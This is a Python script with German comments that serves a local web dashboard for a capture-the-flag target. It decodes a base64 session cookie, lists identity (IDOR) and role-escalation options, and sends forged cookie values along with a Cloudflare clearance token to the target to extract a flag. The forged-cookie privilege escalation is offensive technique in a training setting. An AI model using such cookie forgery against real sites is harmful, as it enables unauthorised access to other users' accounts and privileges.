#!/usr/bin/env python3
# recon_map.py — Recon als interaktive Angriffsflaechen-MAP (statt linearer Stepper).
#
# Backend = kleine JSON-API (/api/recon, /api/fire), Frontend = Node-Graph.
# Modernes SaaS-Layout, Pixelart nur als Ornament. Braucht recon.py daneben.
# Start: python3 recon_map.py  -> http://127.0.0.1:8777

import re, json, webbrowser, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
from recon import classify

DEFAULT_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")
DEFAULT_URL = "https://pointeuse.cyberzerk.fr/"
DEFAULT_COOKIE = "profil"
DEFAULT_RAW = "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"
FLAG_RE = r"CyberZerk\{.*?\}"
PORT = 8777

DEFAULTS = {"url": DEFAULT_URL, "ua": DEFAULT_UA,
            "cname": DEFAULT_COOKIE, "raw": DEFAULT_RAW}

PAGE = r"""<!doctype html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Recon Map</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{color-scheme:dark;--bg:#0c0f14;--panel:#141a22;--panel2:#1a222c;--edge:#263040;
--ink:#e6edf3;--mut:#8696a8;--accent:#f0883e;--accent2:#ffb15c;--ok:#46c66d;--bad:#ff6b57;--line:#2f3b4c}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--ink)}
.bar{position:sticky;top:0;z-index:5;background:rgba(12,15,20,.9);backdrop-filter:blur(8px);
border-bottom:1px solid var(--edge);padding:12px 18px;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:9px;font-weight:700;font-size:15px;margin-right:6px}
.brand .px{width:20px;height:20px;image-rendering:pixelated}
.field{display:flex;flex-direction:column;gap:3px}
.field label{font-size:10px;color:var(--mut);font-weight:600;text-transform:uppercase;letter-spacing:.4px}
.field input{background:var(--panel);border:1px solid var(--edge);border-radius:7px;color:var(--ink);
padding:7px 9px;font:12px ui-monospace,Menlo,monospace}
.field.grow{flex:1;min-width:150px}
.field input:focus{outline:none;border-color:var(--accent)}
.btn{background:var(--accent);color:#1a1206;border:0;border-radius:8px;font-weight:700;font-size:13px;
padding:9px 16px;cursor:pointer;align-self:flex-end}
.btn:hover{background:var(--accent2)}
.btn.ghost{background:transparent;color:var(--mut);border:1px solid var(--edge)}
#stage{position:relative;height:calc(100vh - 62px);overflow:auto}
#map{position:relative;min-width:1180px;min-height:640px;
background-image:radial-gradient(rgba(255,255,255,.035) 1px,transparent 1px);background-size:9px 9px}
#edges{position:absolute;inset:0;width:100%;height:100%;pointer-events:none}
.node{position:absolute;width:210px;background:var(--panel);border:1px solid var(--edge);
border-radius:11px;box-shadow:0 6px 18px rgba(0,0,0,.35);overflow:hidden;transition:border-color .15s,transform .15s}
.node .hd{display:flex;align-items:center;gap:8px;padding:9px 11px;background:var(--panel2);
border-bottom:1px solid var(--edge);font-size:12px;font-weight:600}
.node .hd .px{width:16px;height:16px;image-rendering:pixelated;flex:none}
.node .bd{padding:9px 11px;font-size:12px;color:var(--mut);line-height:1.45;word-break:break-all}
.node .bd code{color:var(--ink);font-family:ui-monospace,Menlo,monospace;font-size:11px}
.tag{display:inline-block;font-size:10px;font-weight:700;padding:1px 7px;border-radius:20px;margin-left:auto}
.tag.b64{background:#1e2a3a;color:#9db4ff}.tag.idor{background:#3a2140;color:#e59bff}
.tag.role{background:#3a2a16;color:var(--accent2)}
.cand{position:absolute;width:200px;cursor:pointer;background:var(--panel);border:1px solid var(--edge);
border-radius:9px;padding:8px 11px;font:12px/1.2 ui-monospace,Menlo,monospace;color:var(--ink);
display:flex;align-items:center;justify-content:space-between;gap:8px;transition:.12s}
.cand>span:first-child{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cand .go{flex:none;white-space:nowrap}
.cand:hover{border-color:var(--accent);transform:translateX(2px)}
.cand .go{font-family:Inter;font-size:10px;color:var(--mut)}
.cand.sel{border-color:var(--accent);background:#20160b}
.cand.win{border-color:var(--ok);background:#13261a}
.cand.lose{border-color:var(--bad)}
.node.result{width:230px}
.node.result.win{border-color:var(--ok)}.node.result.lose{border-color:var(--bad)}
.flag{color:var(--ok);font-weight:700;font-family:ui-monospace,Menlo,monospace;font-size:12px}
.hintline{position:absolute;left:24px;bottom:14px;font-size:11px;color:var(--mut);max-width:560px}
.spin{width:13px;height:13px;border:2px solid var(--edge);border-top-color:var(--accent);
border-radius:50%;display:inline-block;animation:sp .7s linear infinite;vertical-align:-2px}
@keyframes sp{to{transform:rotate(360deg)}}
.empty{position:absolute;left:50%;top:44%;transform:translateX(-50%);text-align:center;color:var(--mut)}
</style></head><body>
<div class="bar">
  <div class="brand"><svg class="px" viewBox="0 0 8 8" shape-rendering="crispEdges"></svg>Recon&nbsp;Map</div>
  <div class="field grow"><label>Ziel-URL</label><input id="url"></div>
  <div class="field grow"><label>cf_clearance</label><input id="cf" placeholder="cf_clearance…"></div>
  <div class="field"><label>Cookie</label><input id="cname" style="width:90px"></div>
  <div class="field grow"><label>Cookie-Wert (roh)</label><input id="raw"></div>
  <button class="btn" onclick="scan()">Scan</button>
</div>
<div id="stage"><div id="map"><svg id="edges"></svg>
  <div class="empty" id="empty">Scan starten, um die Angriffsfläche zu kartieren.</div>
  <div class="hintline" id="hint"></div>
</div></div>
<script>
/*DEFAULTS*/
const $=id=>document.getElementById(id);
['url','ua','cname','raw'].forEach(k=>{if($(k)&&DEFAULTS[k])$(k).value=DEFAULTS[k];});
let UA=DEFAULTS.ua;

// Pixel-Ornament-Sprites
const SP={
 cookie:'.######.|########|##o###o#|########|#o####o#|###o####|########|.######.',
 key:'.###....|#...#...|#...#...|.###....|..#.....|..###...|..#.....|..##....',
 flag:'#.......|#####o..|#oooo#..|#ooo#o..|#oo#....|#.......|#.......|#.......',
 chip:'.######.|#.####.#|#.####.#|#.####.#|#.####.#|#.####.#|#.####.#|.######.'};
function sprite(k,color){const rows=SP[k].split('|');let r='';
 rows.forEach((row,y)=>[...row].forEach((ch,x)=>{if(ch=='#')r+=`<rect x=${x} y=${y} width=1 height=1 fill="${color}"/>`;
 else if(ch=='o')r+=`<rect x=${x} y=${y} width=1 height=1 fill="#000" fill-opacity=.35/>`;}));
 return `<svg class=px viewBox="0 0 8 8" shape-rendering=crispEdges>${r}</svg>`;}
$('empty').insertAdjacentHTML('beforebegin','');
document.querySelector('.brand .px').outerHTML=sprite('cookie','var(--accent)');

const map=$('map'),edges=$('edges');
let nodes={}; // id -> element, for edge geometry

function placeNode(id,col,top,html,cls=''){
 const COLX=[24,270,516,762,1010];
 const el=document.createElement('div');el.className='node '+cls;
 el.style.left=COLX[col]+'px';el.style.top=top+'px';el.innerHTML=html;
 el.dataset.col=col;map.appendChild(el);nodes[id]=el;return el;}

function center(el,side){const r=el.getBoundingClientRect(),m=map.getBoundingClientRect();
 const y=r.top-m.top+r.height/2;
 const x=side=='r'?r.left-m.left+r.width:r.left-m.left;return {x,y};}
function edge(a,b,cls=''){const p=center(a,'r'),q=center(b,'l');
 const d=`M${p.x} ${p.y} C ${p.x+50} ${p.y}, ${q.x-50} ${q.y}, ${q.x} ${q.y}`;
 const path=document.createElementNS('http://www.w3.org/2000/svg','path');
 path.setAttribute('d',d);path.setAttribute('class','ln '+cls);
 path.setAttribute('fill','none');
 path.setAttribute('stroke',cls=='win'?'var(--ok)':'var(--line)');
 path.setAttribute('stroke-width',cls=='win'?'2.5':'1.6');edges.appendChild(path);}

let lastEdges=[]; // [aId,bId,cls]
function redraw(){edges.innerHTML='';lastEdges.forEach(([a,b,c])=>{if(nodes[a]&&nodes[b])edge(nodes[a],nodes[b],c);});}
addEventListener('resize',redraw);

let CTX={}; // scan context for firing
async function scan(){
 const body={cname:$('cname').value,raw:$('raw').value};
 const f=await (await fetch('/api/recon',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify(body)})).json();
 render(f);
}

function render(f){
 map.querySelectorAll('.node,.cand').forEach(n=>n.remove());nodes={};lastEdges=[];edges.innerHTML='';
 $('empty').style.display='none';
 let host='Ziel';try{host=new URL($('url').value).host;}catch(e){}
 CTX={url:$('url').value,cf:$('cf').value,cname:$('cname').value};

 placeNode('target',0,250,`<div class=hd>${sprite('chip','var(--mut)')}Ziel</div>
   <div class=bd><code>${host}</code></div>`);
 const content=f.json?JSON.stringify(f.json):'(nicht dekodierbar)';
 placeNode('cookie',1,232,`<div class=hd>${sprite('cookie','var(--accent)')}Cookie ‘${f.cookie}’
   <span class="tag b64">${f.encoding}</span></div>
   <div class=bd><code>${content}</code></div>`);
 lastEdges.push(['target','cookie','']);

 // Levers (col 2) + candidates (col 3)
 let roleLever=null, cands=[];
 f.levers.forEach(lv=>{
   if(lv.typ=='identitaet'){
     placeNode('lv_id',2,150,`<div class=hd>${sprite('key','#e59bff')}Identität
       <span class="tag idor">IDOR</span></div>
       <div class=bd><code>${lv.key}=${lv.aktuell}</code><br>${lv.hinweis}</div>`,'');
     lastEdges.push(['cookie','lv_id','']);
   }else{
     placeNode('lv_role',2,330,`<div class=hd>${sprite('key','var(--accent2)')}Rolle
       <span class="tag role">${lv.mutationen.filter(m=>m.cookie_value).length}×</span></div>
       <div class=bd><code>${lv.key}=${lv.aktuell}</code> · Eskalationen →</div>`,'');
     roleLever='lv_role';lastEdges.push(['cookie','lv_role','']);
     cands=lv.mutationen.filter(m=>m.cookie_value);
   }
 });

 // candidate chips (col 3), stacked
 const CX=762; let y=110;
 cands.forEach((m,i)=>{
   const el=document.createElement('div');el.className='cand';el.style.left=CX+'px';el.style.top=y+'px';
   el.innerHTML=`<span>${m.set}</span><span class=go>feuern →</span>`;
   el.onclick=()=>fire(el,m,'cand'+i);
   map.appendChild(el);nodes['cand'+i]=el;
   if(roleLever)lastEdges.push([roleLever,'cand'+i,'']);
   y+=46;
 });
 redraw();
 $('hint').textContent='Die Map zeigt beide Hebel gleichzeitig. Welcher Kandidat gewinnt, weiß Recon nicht — genau hier käme der LLM-Schritt.';
}

async function fire(el,m,cid){
 document.querySelectorAll('.cand').forEach(c=>c.classList.remove('sel'));el.classList.add('sel');
 if(nodes['result'])nodes['result'].remove();
 const top=parseInt(el.style.top)-20;
 placeNode('result',4,top,`<div class=hd>${sprite('flag','var(--mut)')}Ergebnis</div>
   <div class=bd><span class=spin></span> sende …</div>`,'result');
 lastEdges=lastEdges.filter(e=>e[0]!=cid||e[1]!='result');lastEdges.push([cid,'result','']);redraw();
 let res;
 try{res=await (await fetch('/api/fire',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({url:CTX.url,cf:CTX.cf,ua:UA,cname:CTX.cname,forged:m.cookie_value})})).json();}
 catch(e){res={error:String(e)};}
 const r=nodes['result'];
 if(res.flag){r.className='node result win';r.querySelector('.bd').innerHTML=`<div class=flag>${res.flag}</div>
   <div style="margin-top:4px">HTTP ${res.status}</div>`;
   el.classList.add('win');lastEdges=lastEdges.map(e=>e[0]==cid&&e[1]=='result'?[cid,'result','win']:e);}
 else{r.className='node result lose';el.classList.add('lose');
   r.querySelector('.bd').innerHTML=(res.error||'Kein Flag.')+(res.status?`<br>HTTP ${res.status}`:'')
   +'<br><span style="color:var(--mut)">cf_clearance frisch? UA korrekt?</span>';}
 redraw();
}
</script></body></html>"""


def send_json(h, obj):
    b = json.dumps(obj).encode()
    h.send_response(200)
    h.send_header("Content-Type", "application/json")
    h.end_headers()
    h.wfile.write(b)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        html = PAGE.replace("/*DEFAULTS*/", f"const DEFAULTS={json.dumps(DEFAULTS)};")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _json_body(self):
        n = int(self.headers.get("Content-Length", 0))
        return json.loads(self.rfile.read(n).decode() or "{}")

    def do_POST(self):
        d = self._json_body()
        if self.path == "/api/recon":
            send_json(self, classify(d.get("cname", ""), d.get("raw", "")))
        elif self.path == "/api/fire":
            try:
                r = requests.get(d["url"], headers={"User-Agent": d.get("ua", DEFAULT_UA)},
                                 cookies={"cf_clearance": d.get("cf", ""),
                                          d.get("cname", "profil"): d.get("forged", "")},
                                 timeout=20)
                m = re.search(FLAG_RE, r.text)
                send_json(self, {"status": r.status_code, "flag": m.group() if m else None})
            except Exception as e:
                send_json(self, {"error": f"Request fehlgeschlagen: {e}"})
        else:
            self.send_response(404); self.end_headers()


if __name__ == "__main__":
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    u = f"http://127.0.0.1:{PORT}"
    print(f"Recon Map laeuft:  {u}   (Strg+C zum Beenden)")
    threading.Timer(0.6, lambda: webbrowser.open(u)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBeendet.")
